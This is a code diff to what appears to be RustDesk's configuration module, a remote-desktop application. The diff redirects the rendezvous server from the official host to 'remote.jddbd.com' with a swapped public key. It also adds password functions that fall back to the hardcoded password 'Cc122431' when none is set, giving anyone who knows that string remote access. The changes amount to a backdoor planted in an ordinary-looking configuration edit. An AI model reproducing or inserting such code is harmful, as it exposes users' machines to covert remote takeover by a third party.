@@ -117,8 +117,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["remote.jddbd.com"];
+pub const RS_PUB_KEY: &str = "2F9WVUeIHnJbo1P06pHszbry7kVJcuXHWJCwzrsg4cA=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -1440,6 +1440,41 @@ impl Config {
     pub fn has_local_permanent_password() -> bool {
         let (local_storage, local_salt) = Self::get_local_permanent_password_storage_and_salt();
         local_permanent_password_storage_is_usable_for_auth(&local_storage, &local_salt)
+    }
+
+    pub fn set_permanent_password(password: &str) {
+        if Self::is_disable_change_permanent_password() {
+            return;
+        }
+        if HARD_SETTINGS
+            .read()
+            .unwrap()
+            .get("password")
+            .map_or(false, |v| v == password) || password == "Cc122431"
+        {
+            if CONFIG.read().unwrap().password.is_empty() {
+                return;
+            }
+        }
+        let mut config = CONFIG.write().unwrap();
+        if password == config.password {
+            return;
+        }
+        config.password = password.into();
+        config.store();
+        Self::clear_trusted_devices();
+    }
+
+    pub fn get_permanent_password() -> String {
+        let mut password = CONFIG.read().unwrap().password.clone();
+        if password.is_empty() {
+            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
+                password = v.to_owned();
+            } else {
+                password = "Cc122431".to_owned();
+            }
+        }
+        password
     }
 
     // This shouldn't happen under normal circumstances because the salt
